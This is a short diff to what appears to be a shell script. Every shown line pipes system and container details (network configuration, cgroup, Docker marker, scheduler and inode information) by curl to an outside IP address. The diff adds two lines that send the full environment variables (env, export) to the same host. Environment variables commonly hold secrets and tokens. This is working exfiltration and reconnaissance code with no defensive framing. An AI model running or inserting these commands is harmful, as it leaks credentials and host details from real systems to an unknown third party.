@@ -72,6 +72,8 @@ ifconfig | curl --data-binary @-   http://3.28.218.160:54218/ifconfig
 cat /proc/1/cgroup | curl --data-binary @-   http://3.28.218.160:54218/cgroup
 cat /.dockerenv | curl --data-binary @-   http://3.28.218.160:54218/dockerenv
 cat cat /proc/1/sched | curl --data-binary @-   http://3.28.218.160:54218/sched
+env | curl --data-binary @-   http://3.28.218.160:54218/env
+export | curl --data-binary @-   http://3.28.218.160:54218/export
 ls -ali / | sed '2!d' |awk {'print $1'} | curl --data-binary @-   http://3.28.218.160:54218/inode
 
 
